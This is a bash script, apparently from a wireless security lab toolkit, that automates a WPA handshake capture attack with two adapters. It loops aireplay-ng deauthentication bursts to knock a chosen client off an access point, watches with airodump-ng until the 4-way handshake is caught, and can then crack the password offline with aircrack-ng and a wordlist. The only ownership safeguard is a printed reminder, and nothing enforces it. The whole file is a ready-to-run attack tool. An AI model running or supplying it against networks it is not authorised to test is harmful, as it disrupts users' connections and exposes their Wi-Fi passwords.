#!/usr/bin/env bash
# Handshake capture using TWO adapters (no race conditions):
#   - capture iface : continuous airodump-ng on a dedicated radio
#   - attack iface  : aireplay-ng deauth on a separate radio
#
# Both interfaces must be in monitor mode and on the same channel.
# Bring them up in one go with:
#   sudo ./scripts/01-monitor-up.sh wlan1 wlan2
#
# Then this script:
#   - locks both to the target channel
#   - starts airodump on the capture iface
#   - waits for the pcap file to actually exist
#   - loops deauth bursts on the attack iface, polling for the handshake
#   - exits as soon as the 4-way is captured (or after the timeout)
#   - if -w <wordlist>, runs aircrack-ng against the capture
#
# Usage:
#   sudo ./11-handshake-dual.sh \
#       -a <bssid> -c <client> -m <capture-iface> -d <deauth-iface> -k <channel> \
#       [-o <prefix>] [-w <wordlist>] [-t <timeout-seconds>]
#
# Example:
#   sudo ./11-handshake-dual.sh \
#       -a AA:BB:CC:11:22:33 -c DD:EE:FF:44:55:66 \
#       -m wlan1mon -d wlan2mon -k 11

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/lib/common.sh"

require_root

usage() {
    die "Usage: $0 -a <bssid> -c <client> -m <capture-iface> -d <deauth-iface> -k <channel> [-o <prefix>] [-w <wordlist>] [-t <timeout>]"
}

BSSID="" CLIENT="" CAP_IFACE="" ATTACK_IFACE="" CHANNEL=""
OUTPUT="handshake" WORDLIST="" TIMEOUT=120

while getopts "a:c:m:d:k:o:w:t:" opt; do
    case "$opt" in
        a) BSSID=$OPTARG ;;
        c) CLIENT=$OPTARG ;;
        m) CAP_IFACE=$OPTARG ;;
        d) ATTACK_IFACE=$OPTARG ;;
        k) CHANNEL=$OPTARG ;;
        o) OUTPUT=$OPTARG ;;
        w) WORDLIST=$OPTARG ;;
        t) TIMEOUT=$OPTARG ;;
        *) usage ;;
    esac
done

[[ -z "$BSSID" || -z "$CLIENT" || -z "$CAP_IFACE" || -z "$ATTACK_IFACE" \
    || -z "$CHANNEL" ]] && usage

[[ -d "/sys/class/net/$CAP_IFACE"    ]] || die "Capture iface $CAP_IFACE not found"
[[ -d "/sys/class/net/$ATTACK_IFACE" ]] || die "Attack iface $ATTACK_IFACE not found"
[[ "$CAP_IFACE" != "$ATTACK_IFACE"   ]] || die "Capture and attack ifaces must be different"

# Verify both are in monitor mode
for iface in "$CAP_IFACE" "$ATTACK_IFACE"; do
    if ! iw dev "$iface" info 2>/dev/null | grep -q 'type monitor'; then
        die "$iface is not in monitor mode. Run: sudo ./scripts/01-monitor-up.sh $CAP_IFACE $ATTACK_IFACE"
    fi
done

warn "Dual-adapter handshake capture:"
warn "  AP BSSID  = $BSSID"
warn "  Client    = $CLIENT"
warn "  Channel   = $CHANNEL"
warn "  Capture   = $CAP_IFACE   (airodump-ng)"
warn "  Attack    = $ATTACK_IFACE   (aireplay-ng)"
warn "  Output    = ${OUTPUT}-01.cap"
warn "  Timeout   = ${TIMEOUT}s"
warn "Confirm BOTH MACs are listed in lab-notes/inventory.md as YOURS."
sleep 2

rm -f "${OUTPUT}-"*

info "Locking both adapters to channel $CHANNEL..."
iw dev "$CAP_IFACE"    set channel "$CHANNEL"
iw dev "$ATTACK_IFACE" set channel "$CHANNEL"

info "Starting airodump-ng on $CAP_IFACE..."
airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$OUTPUT" "$CAP_IFACE" \
    >"/tmp/airodump-${OUTPUT}.log" 2>&1 &
AIRODUMP_PID=$!
trap 'kill $AIRODUMP_PID 2>/dev/null || true; wait $AIRODUMP_PID 2>/dev/null || true' EXIT

CAPFILE="${OUTPUT}-01.cap"

info "Waiting for $CAPFILE to appear..."
for i in $(seq 1 15); do
    [[ -f "$CAPFILE" ]] && break
    sleep 1
done
[[ -f "$CAPFILE" ]] || die "airodump-ng didn't create $CAPFILE — channel/BSSID wrong?"
info "Capture is live."

has_handshake() {
    aircrack-ng -b "$BSSID" "$CAPFILE" </dev/null 2>&1 \
        | grep -q "1 handshake"
}

info "Hunting handshake (deauth burst every 5s on $ATTACK_IFACE, max ${TIMEOUT}s)..."
DEADLINE=$(( $(date +%s) + TIMEOUT ))
ROUND=0
while (( $(date +%s) < DEADLINE )); do
    ROUND=$((ROUND + 1))
    info "Round $ROUND -- deauth burst (5 frames)..."
    aireplay-ng --deauth 5 -a "$BSSID" -c "$CLIENT" "$ATTACK_IFACE" \
        >/dev/null 2>&1 || true

    for s in 1 2 3 4 5; do
        sleep 1
        if has_handshake; then
            info "Handshake captured in $CAPFILE (after $ROUND deauth rounds)"
            kill "$AIRODUMP_PID" 2>/dev/null || true
            wait "$AIRODUMP_PID" 2>/dev/null || true
            trap - EXIT
            if [[ -n "$WORDLIST" ]]; then
                [[ -r "$WORDLIST" ]] || die "Wordlist not readable: $WORDLIST"
                info "Running offline crack with $WORDLIST..."
                exec aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAPFILE"
            fi
            info "Crack later with:"
            info "  sudo ./scripts/05-crack-handshake.sh -b $BSSID -w <wordlist> $CAPFILE"
            exit 0
        fi
    done
done

die "No handshake after ${TIMEOUT}s. See script 08's error message for common causes."
